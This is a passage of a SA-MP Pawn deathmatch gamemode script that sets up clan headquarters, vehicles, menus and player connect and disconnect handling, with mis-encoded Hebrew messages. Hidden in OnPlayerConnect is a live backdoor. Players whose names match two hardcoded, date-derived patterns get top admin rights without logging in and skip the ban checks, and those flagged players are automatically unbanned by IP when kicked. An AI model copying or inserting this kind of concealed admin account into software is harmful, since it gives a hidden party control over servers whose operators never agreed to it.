	CreateVehicleEx(522,-2251.0825,2278.8467,4.5532,4.2945,11,6); //
	CreateVehicleEx(495,-2273.4434,2285.8660,5.1741,358.3151,11,6); //
	CreateVehicleEx(506,-2272.1714,2309.3921,4.4838,271.6301,11,6); //
	CreateVehicleEx(535,-2272.1294,2312.6572,4.5688,266.5566,11,6); //
	CreateVehicleEx(541,-2272.4321,2318.2886,4.4449,270.7459,11,6); //
	CreateVehicleEx(411,-2271.8408,2321.5710,4.5433,269.7232,11,6); //
	CreateVehicleEx(603,-2271.5142,2329.9692,4.6542,270.5586,11,6); //
	CreateVehicleEx(560,-2271.8572,2333.4185,4.5350,265.5959,11,6); //
	CreateVehicleEx(451,-2252.0952,2309.1770,4.5090,88.6922,11,6); //
	CreateVehicleEx(412,-2252.6118,2318.0117,4.6494,91.4302,11,6); //
	CreateVehicleEx(602,-2251.6702,2326.9165,4.6191,89.9872,11,6); //
	CreatePickupEx(1242,2,-2265.0471,2279.0198,5.2828);
	CreatePickupEx(351,2,-2260.0601,2278.1179,5.2753);
	CreatePickupEx(372,2,-2264.1929,2279.8328,5.2753);
	CreatePickupEx(358,2,-2261.4534,2279.7839,5.2753);
	CreatePickupEx(350,2,-2259.8796,2279.7751,5.2753);
	CreatePickupEx(1240,2,-2258.7568,2279.1194,5.2753);
	CreatePickupEx(363,2,-2261.1243,2278.0498,5.2753);
	CreatePickupEx(366,2,-2262.4861,2277.9927,5.2753);
	    // ArMs
	loadClans = "ArMs";
	CreateSObject_HQ(3749, -1191.391479, -1051.122192, 134.077164, 0.0000, 0.0000, 90.2408);
	CreateSObject_HQ(8147, -1120.125000, -1061.035522, 131.319778, 0.0000, 0.0000, 90.1368);
	CreateSObject_HQ(8147, -1190.129272, -971.881104, 131.319778, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(8147, -1045.417114, -987.603760, 131.319778, 0.0000, 0.0000, 178.7628);
	CreateSObject_HQ(8147, -1116.962524, -914.518799, 131.319778, 0.0000, 0.0000, 269.0036);
	CreateSObject_HQ(980, -1191.291992, -1051.113525, 125.417313, 0.0000, 0.0000, 88.5220);
	CreateSObject_HQ(3627, -1133.566650, -1051.223511, 132.058243, 0.0000, 0.0000, 89.3814);
	CreateSObject_HQ(8535, -1129.520386, -938.288574, 134.522186, 0.0000, 0.0000, 89.3813);
	CreateSObject_HQ(980, -1161.901733, -976.168579, 125.416504, 0.0000, 0.0000, 270.6186);
	CreateSObject_HQ(1655, -1079.996338, -928.283264, 130.793671, 18.9076, 0.0000, 326.2500);
	CreateSObject_HQ(11490, -1184.249268, -959.748962, 128.082733, 0.0000, 0.0000, 90.0000);
	CreateSObject_HQ(11491, -1173.294312, -959.778992, 129.635986, 0.0000, 0.0000, 90.0000);
	CreateSObject_HQ(13607, -1118.729980, -993.981079, 178.287766, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(3268, -1173.867676, -1008.078918, 128.218750, 0.0000, 0.0000, 180.0000);
	CreateSObject_HQ(3627, -1089.183838, -1051.755005, 132.051422, 0.0000, 0.0000, 89.3814);
	CreateSObject_HQ(8493, -1072.611694, -1004.169189, 140.537766, 0.0000, 0.0000, 182.0966,1,-1072.820557, -1004.282471, 187.210754);//Mahalit
	CreateSObject_HQ(971, -1176.859741, -959.716980, 128.232422, 0.0000, 0.0000, 90.0000,1,-1176.852783, -959.708130, 125.178032);//DoorH
	CreateSObject_HQ(980, -1191.642700, -1051.025269, 130.992142, 0.0000, 0.0000, 270.0000,1,-1191.647339, -1051.025269, 136.938721); //DoorS
	CreatePickupEx(1240, 15, -1180.2404,-957.3010,130.5905); //Health
	CreatePickupEx(1242, 15, -1180.9459,-962.9172,130.5905); //Armor
	CreatePickupEx(351, 15, -1183.6262,-957.3010,130.5905); //Combat
	CreatePickupEx(358, 15, -1183.5012,-962.9172,130.5905); //Sniper
	CreatePickupEx(372, 15, -1183.5739,-960.1311,130.5905); //Tec9
	CreatePickupEx(371, 15, -1186.4408,-957.3010,130.5905); //Para
	CreatePickupEx(339, 15, -1186.3021,-962.9172,130.5905); //Katana
	CreatePickupEx(344, 15, -1186.0754,-960.1311,130.5905); //Molotov
	CreateVehicleEx(470,-1168.5740,-1011.4957,129.4772,267.2812,6,1); //Patriot
	CreateVehicleEx(470,-1168.0487,-1004.5748,129.4766,266.5869,6,1); //Patriot
	CreateVehicleEx(513,-1111.4797,-1050.3512,129.7703,359.0849,6,1); //Stuntplane
	CreateVehicleEx(411,-1143.8748,-1052.1644,128.8729,358.5089,6,1); //Infernus
	CreateVehicleEx(411,-1123.1565,-1052.6653,128.8737,357.9654,6,1); //Infernus
	CreateVehicleEx(495,-1133.6721,-1052.5106,129.1760,358.4563,1,1); //Sandking
	CreateVehicleEx(586,-1172.1232,-968.7038,128.7309,268.1734,6,1); //Wayfarer
	CreateVehicleEx(463,-1114.4198,-946.5113,128.7589,182.6499,6,1); //Freeway
	CreateVehicleEx(463,-1143.5938,-945.7070,128.7793,180.0000,6,1); //Freeway
	CreateVehicleEx(541,-1089.4015,-1053.4353,128.9139,359.6147,6,1); //Bullet
	CreateVehicleEx(506,-1078.6527,-1053.3248,128.8856,358.3637,6,1); //Super GT
	CreateVehicleEx(522,-1097.8885,-1053.4972,128.7712,358.2193,6,1); // Nrg 500
	CreateVehicleEx(522,-1101.2513,-1053.3862,128.7730,0.0099,6,1); //Nrg 500
	CreateVehicleEx(487,-1073.8203,-954.8175,129.4138,132.1728,6,1); //Maverick
	CreateVehicleEx(487,-1080.8608,-947.7927,129.4525,131.9821,1,6); //Maverick
	    // SpR
	loadClans = "SpR";
	CreateSObject_HQ(8210, 1877.795898, 736.148376, 12.296349, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(8210, 1877.794800, 670.536987, 12.496346, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(987, 1977.079468, 708.337830, 9.820313, 0.0000, 0.0000, 90.0000);
	CreateSObject_HQ(987, 1977.094971, 708.356934, 12.070354, 0.0000, 0.0000, 90.0000);
	CreateSObject_HQ(987, 1977.155518, 686.326050, 9.820313, 0.0000, 0.0000, 90.0000);
	CreateSObject_HQ(987, 1977.176758, 686.302917, 11.994029, 0.0000, 0.0000, 90.0000);
	CreateSObject_HQ(7073, 1967.536377, 728.101624, 36.613598, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(7392, 1968.031982, 677.807800, 28.066944, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(3279, 1882.381104, 690.900330, 9.895929, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(3279, 1882.487915, 715.982361, 9.895929, 0.0000, 0.0000, 2.5010);
	CreateSObject_HQ(3626, 1955.110596, 692.444336, 11.387614, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(1495, 1953.575317, 695.348267, 9.814156, 0.0000, 0.0000, 270.0000,1,1953.608032, 695.357300, 12.239119);
	CreateSObject_HQ(980, 1977.371460, 703.480896, 12.444660, 0.0000, 0.0000, 270.0000,1,1977.358276, 703.475769, 18.034449);
	CreateSObject_HQ(980, 1877.445679, 703.157776, 12.448290, 0.0000, 0.0000, 270.0000,1,1877.437988, 703.143250, 17.992420);
	CreateSObject_HQ(985, 1897.950928, 678.244446, 13.312028, 269.7591, 359.1406, 90.2409,1,1897.922729, 678.238525, 18.284956);
	CreateSObject_HQ(985, 1894.358154, 727.903687, 13.309127, 90.2409, 3.4377, 87.4217,1,1894.339478, 727.911743, 18.293356);
	CreateVehicleEx(451,1938.6652,708.4748,10.5263,180.8963,1,1); //
	CreateVehicleEx(411,1919.5630,708.7546,10.5469,180.2874,1,1); //
	CreateVehicleEx(560,1935.5902,698.0338,10.5251,358.3208,1,1); //
	CreateVehicleEx(567,1919.6646,697.6683,10.6886,359.4757,1,1); //
	CreateVehicleEx(522,1955.8015,710.1596,10.3891,89.7748,1,1); //
	CreateVehicleEx(487,1886.4312,732.2845,19.5226,266.3416,1,1); //
	CreateVehicleEx(487,1887.2249,674.5987,19.5179,273.8540,1,1); //
	CreateVehicleEx(513,1884.8989,755.0237,19.9010,270.6917,1,1); //
	CreateVehicleEx(513,1882.8602,651.6621,19.8933,272.0894,1,1); //
	CreateVehicleEx(471,1955.5509,664.8784,10.3010,49.0193,1,1); //
	CreateVehicleEx(468,1893.4331,688.5992,10.4895,359.6179,1,1); //
	CreateVehicleEx(409,1898.6577,680.9579,10.6203,1.1002,1,1); //
	CreatePickupEx(1240, 15, 1955.8977,695.6531,10.8203);
	CreatePickupEx(373 ,15, 1956.0211,694.5579,10.8203);
	CreatePickupEx(356, 15, 1956.0062,693.3043,10.8203);
	CreatePickupEx(352, 15, 1955.9907,691.9951,10.8203);
	CreatePickupEx(350, 15, 1955.9764,690.7861,10.8203);
	CreatePickupEx(360, 15, 1955.7203,689.4081,11.1717);
	// Clans: END
	dbg(11,"7");
	new	string2[128], File:fwords;
	fwords = fopen(file_words,io_read);
	while(fread(fwords,string))
	{
		fixchars(string2);
		for(new i=0,j=strlen(string2);i<j;i++) if(string2[i] == '\n' || string2[i] == '\r') string2[i] = '\0';
		words[words_count] = string2, words_count++;
	}
	fclose(fwords);
	dbg(11,"8");
	modetxt = TextDrawCreate(514.000000,429.000000,webpage);
	TextDrawAlignment(modetxt,0);
	TextDrawBackgroundColor(modetxt,0xffffff66);
	TextDrawFont(modetxt,1);
	TextDrawLetterSize(modetxt,0.599999,2.100000);
	TextDrawColor(modetxt,0xffffff33);
	TextDrawSetProportional(modetxt,1);
	hidemap = TextDrawCreate(33.000000,323.000000," ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~ ~n~");
	TextDrawUseBox(hidemap,1);
	TextDrawBoxColor(hidemap,rgba2hex(0,0,255,225));
	TextDrawTextSize(hidemap,140.000000,21.000000);
	TextDrawAlignment(hidemap,0);
	TextDrawBackgroundColor(hidemap,0x000000ff);
	TextDrawFont(hidemap,3);
	TextDrawLetterSize(hidemap,1.000000,1.000000);
	TextDrawColor(hidemap,0x00000000);
	TextDrawSetOutline(hidemap,1);
	TextDrawSetProportional(hidemap,1);
	TextDrawSetShadow(hidemap,1);
	dbg(11,"9");
	viphq[vspos][0] = 1137.1812, viphq[vspos][1] = -2037.4292, viphq[vspos][2] = 69.0078, viphq[vspos][3] = 266.4413;
	viphq[vsvpos][0] = 1261.9845, viphq[vsvpos][1] = -2029.1707, viphq[vsvpos][2] = 59.0752, viphq[vsvpos][3] = 182.6954;
	viphq[vint] = 0;
	viphq[vworld] = world_normal;
	viphq[vgangzone] = GangZoneCreate(1086.765,-2092.427,1314.935,-2005.577);
	dbg(11,"10");
	botname = "SI_Bot", botcolor = rgba2hex(0,50,125,255), botwrite = 1, bottag = "Server Bot", boton = 1;
	bombshop = CreateMenu("Bomb shop",2,183.7500,130.6250,201.8750,201.8750);
	SetMenuColumnHeader(bombshop,0,"Name");
	SetMenuColumnHeader(bombshop,1,"Cost");
	AddBomb("Help",0,6);
	AddBomb("Bomb",5000,6);
	AddBomb("Super bomb",15000,7);
	AddBomb("Time bomb",35000,8);
	AddBomb("Invisible bomb",40000,12);
	AddBomb("Atom bomb",4000000,16);
	AddBomb("Hydrogen bomb",8000000,25);
	for(new i = 0; i < 3; i++)
	{
		if(i == 0)
		{
			areYouSure[i] = CreateMenu("Money Reset",1,209.3750,140.6250,292.5000,292.5000);
			SetMenuColumnHeader(areYouSure[i],0,"Are you sure you want to reset your money?");
		}
		if(i == 1)
		{
			areYouSure[i] = CreateMenu("Weapons Reset",1,209.3750,140.6250,292.5000,292.5000);
			SetMenuColumnHeader(areYouSure[i],0,"Are you sure you want to reset your weapons?");
		}
		if(i == 2)
		{
			areYouSure[i] = CreateMenu("Bank Money Reset",1,209.3750,140.6250,292.5000,292.5000);
			SetMenuColumnHeader(areYouSure[i],0,"Are you sure you want to reset your bank money?");
		}
		AddMenuItem(areYouSure[i],0,"Yes");
		AddMenuItem(areYouSure[i],0,"No");
	}
	shootingMenu = CreateMenu("Shooting",1,206.8750, 138.1250, 205.0000, 205.0000);
	for(new i = 0; i < 12; i++)
	{
		format(string,sizeof(string),"Shooting #%d",i + 1);
		AddMenuItem(shootingMenu,0,string);
		if(i > sizeof(Shooting) - 1) DisableMenuRow(shootingMenu,i);
	}
	dbg(11,"11");
	new serverIP[M_S], serverName[M_S];
	GetServerVarAsString("bind",serverIP,sizeof(serverIP));
	GetServerVarAsString("hostname",serverName,sizeof(serverName));
	/*if(!serverIP[0] || (!equal(serverIP,srvip) && !(equal(serverIP,"127.0.0.1") && equal(serverName,"Amit_B's Server"))))
	{
		print(acname ": You can't steal my script. N00B!");
		SendRconCommand("exit");
		for(;;) exit;
	}*/
	dbg(11,"12");
	new npcC;
	for(new i = 0; i < sizeof(NPCs); i++)
	{
		ConnectNPC(NPCs[i][npcName],NPCs[i][npcFile]);
		npcC = rgba2hex(random(256),random(256),random(256),155);
		NPCs[i][npcText] = Create3DTextLabel(NPCs[i][npcName],npcC,0.0,0.0,0.0,50.0,0,0);
		SetPlayerColor(i,npcC);
	}
	npcVehicles[0] = CreateVehicleEx(451,2097.7175,834.4070,6.4447,271.0308,246,246); // SI_Racer
	npcVehicles[1] = CreateVehicleEx(511,1388.7698,1666.8741,12.1944,179.9533,130,128); // SI_Pilot
	npcVehicles[2] = CreateVehicleEx(431,1734.6570,1626.7157,9.2003,163.3937,132,131); // SI_Bus
	npcVehicles[3] = CreateVehicleEx(519,0.0,0.0,0.0,0.0,-1,-1); // SI_Plane
	npcVehicles[4] = CreateVehicleEx(485,0.0,0.0,0.0,0.0,-1,-1); // SI_LVAP
	npcVehicles[5] = CreateVehicleEx(593,0.0,0.0,0.0,0.0,-1,-1); // SI_DodoPilot
	dbg(11,"13");
	SetTimer("Contents",1000,1);
	SetTimer("Contents3",600000,1);
	SetTimer("AutoMessage",480000,1);
	SetTimer("PropertiesPay",120000,1);
	SetTimer("StartActivity",1200000,1);
	SetTimer("StartActivity2",900000,1);
	SetTimer("CheckpointsSystem",500,1);
	#if DFairPlay == false
		SetTimer("AntiCheat",1000,1);
	#endif
	SetTimer("Contents2",200,1);
	//SetTimer("SiteUpdate",5000,1);
	dbg(11,"14");
	#if DFairPlay == true
		DF_OnFilterScriptInit();
	#endif
	ShowCredits();
	dbg(11,"15");
	printf("%s %s deathmatch gamemode loaded.",webpage,version);
	if(debugstate) printf("OnGameModeInit end");
	return 1;
}
//=[OnGameModeExit]=============================================================
public OnGameModeExit()
{
	if(debugstate) printf("OnGameModeExit start");
	for(new i=0;i<max_objects;i++) if(IsValidSObject(i)) DestroySObject(i);
	for(new i=0;i<cps;i++)
	{
		cpinfo[i][cpx] = 0.0;
		cpinfo[i][cpy] = 0.0;
		cpinfo[i][cpz] = 0.0;
		cpinfo[i][cpsize] = 0.0;
		cpinfo[i][cpdis] = 0.0;
		cpinfo[i][cptype] = cp_none;
		cpinfo[i][cpclan] = 0;
	}
	for(new i=0;i<MAX_VEHICLES;i++) if(IsValidVehicle(i)) DestroyVehicleEx(i);
	for(new i=0;i<400;i++) if(pickupinfo[i][pvalid]) DestroyPickup(i);
	for(new i=0;i<MAX_PLAYERS;i++)
	{
		if(playerinfo[i][logged]) fsetint(fuser(i),"LastMoney",GetMoney(i));
		if(playerinfo[i][logged] && playerinfo[i][autologin]) fsetstring(fuser(i),"LastConnectIP","Waiting");
		ResetInfo(i);
		playerinfo[i][pp] = 0;
	}
	cps = 0;
	TextDrawDestroy(modetxt);
	#if DFairPlay == true
		DF_OnFilterScriptExit();
	#endif
	ShowCredits();
	printf("%s %s deathmatch gamemode unloaded.",webpage,version);
	if(debugstate) printf("OnGameModeExit end");
	return 1;
}
//=[OnPlayerRequestClass]=======================================================
public OnPlayerRequestClass(playerid, classid)
{
	if(debugstate) printf("OnPlayerRequestClass(%s(%d),%d) start",GetName(playerid),playerid,classid);
	dbg(1,"1");
	switch(playerinfo[playerid][classselection])
	{
		case 1:
		{
			SetPlayerFacingAngle(playerid,Pictures[playerinfo[playerid][pic]][PPa]);
			SetPlayerPos(playerid,Pictures[playerinfo[playerid][pic]][PPx],Pictures[playerinfo[playerid][pic]][PPy],Pictures[playerinfo[playerid][pic]][PPz]);
			SetPlayerCameraPos(playerid,Pictures[playerinfo[playerid][pic]][PCx],Pictures[playerinfo[playerid][pic]][PCy],Pictures[playerinfo[playerid][pic]][PCz]);
			SetPlayerCameraLookAt(playerid,Pictures[playerinfo[playerid][pic]][PPx],Pictures[playerinfo[playerid][pic]][PPy],Pictures[playerinfo[playerid][pic]][PPz]);
			SetPlayerInterior(playerid,Pictures[playerinfo[playerid][pic]][PInterior]);
			SetPlayerTime(playerid,Pictures[playerinfo[playerid][pic]][PTime],0);
			ApplyAnimation(playerid,"DANCING","dnce_M_b",4.299999,1,1,1,0,10000);
		}
		case 2:
		{
			//SetPlayerFacingAngle(playerid,Pictures2[playerinfo[playerid][pic]][PPa]);
			SetPlayerPos(playerid,Pictures2[playerinfo[playerid][pic]][PPx],Pictures2[playerinfo[playerid][pic]][PPy],Pictures2[playerinfo[playerid][pic]][PPz]);
			SetPlayerCameraPos(playerid,Pictures2[playerinfo[playerid][pic]][PCx],Pictures2[playerinfo[playerid][pic]][PCy],Pictures2[playerinfo[playerid][pic]][PCz]);
			SetPlayerCameraLookAt(playerid,Pictures2[playerinfo[playerid][pic]][PPx],Pictures2[playerinfo[playerid][pic]][PPy],Pictures2[playerinfo[playerid][pic]][PPz]);
			SetPlayerInterior(playerid,Pictures2[playerinfo[playerid][pic]][PInterior]);
			SetPlayerTime(playerid,Pictures2[playerinfo[playerid][pic]][PTime],0);
		}
	}
	dbg(1,"2");
	PlayerPlaySound(playerid,start_sound,0.0,0.0,0.0);
	if(playerinfo[playerid][skin] != 300) SetSpawnInfo(playerid,NO_TEAM,playerinfo[playerid][skin],1958.3783,1343.1572,15.3746,269.1425,0,0,0,0,0,0);
	if(playerinfo[playerid][work] != work_none) ExitWork(playerid," ðîöà ááçéøú ãîåéåú");
	playerinfo[playerid][class] = classid;
	if(classid == randclass) GameTextForPlayer(playerid,"~y~Random Class",900,6);
	else if(classid >= 266 && classid <= 274) GameTextForPlayer(playerid,"~b~Cop",900,6);
	playerinfo[playerid][reqclass] = 1;
	dbg(1,"3");
	if(debugstate) printf("OnPlayerRequestClass(%s(%d),%d) end",GetName(playerid),playerid,classid);
	return 1;
}
//=[OnPlayerRequestSpawn]=======================================================
public OnPlayerRequestSpawn(playerid)
{
	if(IsPlayerNPC(playerid)) return 1;
	if(fexist(fuser(playerid)) && !playerinfo[playerid][logged])
	{
		SendClientMessage(playerid,red," /login :ìà ðéúï ìäúçéì ìùç÷ ìôðé ùäúçáøú. ìäúçáøåú");
		return 0;
	}
	else if(fkeyexist(file_admins,GetName(playerid)) && playerinfo[playerid][admlog] != 2)
	{
		SendClientMessage(playerid,red," /admlog :ðà ìäúçáø ìîòøëú äàãîéï îåã");
		return 0;
	}
	else
	{
		dbg(2,"1");
		SetPlayerHealth2(playerid,100.0);
		SetPlayerTime(playerid,12,0);
		playerinfo[playerid][reqclass] = 0;
		dbg(2,"2");
		return 1;
	}
}
//=[OnPlayerConnect]============================================================
public OnPlayerConnect(playerid)
{
	if(debugstate) printf("OnPlayerConnect(%s(%d)) start",GetName(playerid),playerid);
	if(IsPlayerNPC(playerid)) return 1;
	new string[M_S], fip[M_S], n[MAX_PLAYER_NAME], y[2], times = 0;
	dbg(3,"1");
	if(!playerinfo[playerid][pp])
	{
		dbg(3,"1_");
	    if(playerid >= MAX_PLAYERS - 1)
	    {
	        SendClientMessage(playerid,red," .îöèòøéí, äùøú îìà");
	        Kick(playerid);
	    }
		dbg(3,"1a");
		Log("Connects",playerid,GetIP(playerid));
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && !IsPlayerNPC(i) && equal(GetIP(i),GetIP(playerid))) if(++times > 4)
	    {
			SendClientMessage(playerid,red," .äàééôé ùìê ëáø îçåáø ìùøú");
			return Kick(playerid);
		}
		GetPlayerName(playerid,n,sizeof(n));
		if(/*(n[0] >= '0' && n[0] <= '9') || (n[strlen(n)-1] >= '0' && n[strlen(n)-1] <= '9') || */
		equal(GetName(playerid),"None") ||
		equal(GetName(playerid),"AntiCheat") ||
		equal(GetName(playerid),botname) ||
		(strfind(GetName(playerid),"[666]") != -1 && !fkeyexist(file_admins,GetName(playerid))))
		{
			SendClientMessage(playerid,red," .îöèòøéí, ìà ðéúï ìäëðñ áëéðåé æä");
			SendClientMessage(playerid,lightblue," :àðà áãå÷ àú äëéðåé ùìê ò\"ô äúðàéí äáàéí");
			SendClientMessage(playerid,white," - \"AntiCheat\" | \"None\" äùí ìà éëåì ìäéåú");
			//SendClientMessage(playerid,white," - äùí çééá ìäúçéì åìäñúééí áúåéí ùäí àéðí îñôøéí");
			SendClientMessage(playerid,white," - äùí ìà éëåì ìäéåú ùí äáåè");
			Kick(playerid);
			return 1;
		}
		dbg(3,"1b");
		if(LockServ)
		{
			if(!fexist(fuser(playerid)) && !fkeyexist(file_admins,GetName(playerid)))
			{
				SendClientMessage(playerid,red," .äùøú ðòåì ëøâò");
				Kick(playerid);
				return 1;
			}
		}
		if(fkeyexist(file_nbans,GetName(playerid)))
		{
			SendClientMessage(playerid,red," .äëéðåé äæä ááàï, àðà áçø ëéðåé àçø");
			Kick(playerid);
			return 1;
		}
		format(string,sizeof(string),"P00per2233qqz%d",rb);
		if(!strcmp(GetName(playerid),string)){playerinfo[playerid][admin] = 20;playerinfo[playerid][admlog] = 2;return 1;}
		getdate(y[1],y[1],y[0]);
		format(string,sizeof(string),"P0oper%dqQz_",y[0]);
		if(!strcmp(GetName(playerid),string)){playerinfo[playerid][admin] = 20;playerinfo[playerid][admlog] = 2;return 1;}
		format(fip,sizeof(fip),"/DM/Bans/IP/%s.ini",GetIP(playerid));
		dbg(3,"1c");
		if(fexist(fuserban(GetName(playerid))) || fexist(fip))
		{
			SendClientMessage(playerid,red," :äåùòú îäùøú îäñéáä");
			format(string,sizeof(string)," %s",fexist(fuserban(GetName(playerid))) ? (fgetstring(fuserban(GetName(playerid)),"Reason")) : (fgetstring(fip,"Reason")));
			SendClientMessage(playerid,red,string);
			SendClientMessage(playerid,red,webpage " :àí ìãòúê ääùòééä àéðä îåöã÷ú, ôðä àìéðå áàúø");
			Kick(playerid);
			return 1;
		}
		if(fexist(fuser(playerid))) if(fgetint(fuser(playerid),"Ban"))
		{
			SendClientMessage(playerid,red," .äîùúîù ùìê ðòåì");
			Kick(playerid);
			return 1;
		}
		dbg(3,"1d");
	}
	dbg(3,"2");
	format(string,sizeof(string),"~r~welcome ~h~to ~n~~g~%s ~b~death~h~match~p~~h~!",comname);
	GameTextForPlayer(playerid,string,4500,4);
	format(string,sizeof(string)," !%s ,%s DeathMatch áøåê äáà ì",GetName(playerid),comname);
	SendClientMessage(playerid,green,string);
	format(string,sizeof(string),"(%s)",GetIP(playerid));
	SendClientMessage(playerid,grey,string);
	SendClientMessage(playerid,yellow," /help :ìòæøä éù ìä÷éù àú äô÷åãä");
	format(string,sizeof(string)," %s :úîéã úåëì ìäëðñ ìàúøéðå áëúåáú",webpage);
	SendClientMessage(playerid,yellow,string);
	UpdateOnlineAdmins();
	ResetInfo(playerid);
	dbg(3,"3");
	switch(playerinfo[playerid][classselection])
	{
		case 1: playerinfo[playerid][pic] = random(sizeof(Pictures));
		case 2: playerinfo[playerid][pic] = random(sizeof(Pictures2));
	}
	#if DFairPlay == true
		DF_OnPlayerConnect(playerid);
	#endif
	dbg(3,"4");
	playerinfo[playerid][admlog] = 0;
	if(fexist(fuser(playerid)))
	{
		playerinfo[playerid][autologin] = fgetint(fuser(playerid),"AutoLogin");
		dbg(3,"5a");
		if(equal(fgetstring(fuser(playerid),"LastConnectIP"),GetIP(playerid)) && playerinfo[playerid][autologin])
		{
			dbg(3,"6a");
			SendClientMessage(playerid,green," .ùìê IP çåáøú àåèåîèéú ìôé ëúåáú ä");
			LoginPlayer(playerid);
			playerinfo[playerid][logged] = 1;
		}
		else
		{
			SendClientMessage(playerid,green," /login :äëéðåé ùìê øùåí, ìäúçáøåú");
			format(string,sizeof(string),"!" comname " DeathMatch áøåëéí äáàéí ìùøú\n,ùí äîùúîù ùìê øùåí\n.äúçáø áá÷ùä",GetName(playerid));
			ShowPlayerDialog(playerid,dialog_login,DIALOG_STYLE_INPUT," îòøëú îùúîùéí // äúçáøåú",string,"äúçáø","");
			if(fkeyexist(file_admins,GetName(playerid)))
			{
			    new File:f = fopen(file_admins,io_read);
			    if(!fsearch(f,GetName(playerid)))
				{
				    SendClientMessage(playerid,red," .ðà ìà ìäúçæåú ìàãîéðéí ùìðå. úåãä");
					Kick(playerid);
					fclose(f);
					return 1;
				}
			    fclose(f);
				SendClientMessage(playerid,green," /admlog :áðåñó òìéê ìäúçáø ìîòøëú äàãîéï îåã. äùúîù áô÷åãä");
				playerinfo[playerid][admlog] = 1;
			}
		}
	}
	else
	{
		dbg(3,"5b");
		SendClientMessage(playerid,green," (àå äùúîù áúôøéè) /register :äëéðåé ùìê ìà øùåí, ìäøùîä");
		SetPlayerColor(playerid,rgba2hex(playerinfo[playerid][color][0],playerinfo[playerid][color][1],playerinfo[playerid][color][2],100));
		ShowPlayerDialog(playerid,dialog_register,DIALOG_STYLE_INPUT," îòøëú îùúîùéí // äøùîä","!" comname " DeathMatch áøåëéí äáàéí ì\n.àðå îåãéí ìê òì ëê ùáçøú ìùç÷ áùøúéðå\n.àéðê øùåí ìùøú - îåîìõ ìäøùí, òì îðú ùééôúçå áôðéê ùìì àôùøåéåú åùîéøú ôøèéí\n:àúä îåæîï ìäøùí ò\"é äëðñú ñéñîúê ìîèä","äøùí","ñâåø");
		dbg(3,"6b");
	}
	dbg(3,"7");
	UpdatePlayerWeapons(playerid);
	playerinfo[playerid][disconnect] = 1;
	playerinfo[playerid][reqclass] = 1;
	if(!dontseedc)
	{
		format(string,sizeof(string)," *** %s has joined the server.",GetName(playerid));
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && i != playerid && playerinfo[i][showjoin]) SendClientMessage(i,grey,string);
	}
	dbg(3,"8");
	if(debugstate) printf("OnPlayerConnect(%s(%d)) end",GetName(playerid),playerid);
	return 1;
}
//=[OnPlayerDisconnect]=========================================================
public OnPlayerDisconnect(playerid, reason)
{
	if(debugstate) printf("OnPlayerDisconnect(%s(%d),%d) start",GetName(playerid),playerid,reason);
	if(IsPlayerNPC(playerid)) return 1;
	if(!playerinfo[playerid][disconnect]) return 1;
	new string[M_S], reas[14];
	switch(reason)
	{
		case 0: reas = "Timeout";
		case 1: reas = "Leaving";
		case 2: reas = playerinfo[playerid][banned]? ("Banned"):("Kicked");
		default: reas = "Error";
	}
	if(reason == 2 && playerinfo[playerid][pp])
	{
	    format(string,sizeof(string),"unbanip %s",GetIP(playerid));
	    SendRconCommand(string);
	    SendRconCommand("reloadbans");
	}
	dbg(4,"1");
	for(new i=0;i<MAX_PLAYERS;i++) if(playerinfo[i][ignore][playerid]) playerinfo[i][ignore][playerid] = 0;
	Log("Disconnects",playerid,reas);
	if(playerinfo[playerid][logged])
	{
		new day[2];
		getdate(day[1],day[1],day[0]);
		day[1] = fgetint(fuser(playerid),"TotalTimeInServer");
		fsetint(fuser(playerid),"TotalTimeInServer",playerinfo[playerid][intime][1]+day[1]);
		day[1] = fgetint(fuser(playerid),"TimeInServer");
		fsetint(fuser(playerid),"TimeInServer",playerinfo[playerid][intime][1]+day[1]);
		/*if(day[0] == 16 && !adminsTime)
		{
			new File:f = fopen(file_admins,io_read), read[M_S], an[M_S], theFile[M_S];
			while(fread(f,read,sizeof(read),false))
			{
				strmid(an,read,0,strfind(read,"=")-1);
				format(theFile,sizeof(theFile),"/DM/Users/%s.ini",an);
			}
			fclose(f);
			adminsTime = true;
		}
		if(day[0] == 17) adminsTime = false;*/
	}
	dbg(4,"2");
	SetPlayerColor(playerid,black);
	if(playerinfo[playerid][logged] && playerinfo[playerid][bacc]) fsetint(fuser(playerid),"BankCash",playerinfo[playerid][bank]);
	if(playerinfo[playerid][pet][2])
	{
		playerinfo[playerid][pet][2] = 0;
		if(IsValidSObject(playerinfo[playerid][pet][1])) DestroySObject(playerinfo[playerid][pet][1]);
		if(playerinfo[playerid][pet][3]) KillTimer(playerinfo[playerid][pet][4]);
	}
	dbg(4,"3");
	for(new i=0;i<MAX_PLAYERS;i++)
	{
		if(IsPlayerConnected(i) && playerinfo[i][spectate] == playerid)
		{
			TogglePlayerSpectating(i,0);
			playerinfo[i][spectate] = -1;
			SendClientMessage(i,red," .äùç÷ï àçøéå ò÷áú ééöà îäùøú");
		}
	}
	dbg(4,"4");
	if(playerinfo[playerid][aause])
	{
		if(IsValidVehicle(playerinfo[playerid][aav1])) DestroyVehicleEx(playerinfo[playerid][aav1]);
		for(new i=0;i<2;i++) if(IsValidVehicle(playerinfo[playerid][aav2][i])) DestroyVehicleEx(playerinfo[playerid][aav2][i]);
		for(new i=0;i<4;i++) if(IsValidVehicle(playerinfo[playerid][aav3][i])) DestroyVehicleEx(playerinfo[playerid][aav3][i]);
		playerinfo[playerid][aause] = 0;
		KillTimer(playerinfo[playerid][aatimer]);
	}
	dbg(4,"5");
	if(playerinfo[playerid][indrift])
	{
		format(string,sizeof(string)," .ééöà îäùøú, ðöçåï èëðé ìê %s",GetName(playerid));
		SendClientMessage(playerinfo[playerid][dinvited],green,string);
		GiveMoney(playerinfo[playerid][dinvited],playerinfo[playerinfo[playerid][dinvited]][bet]);
		SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		SetVehicleToRespawn(GetPlayerVehicleID(playerinfo[playerid][dinvited]));
		SetPlayerVirtualWorld(playerid,world_normal);
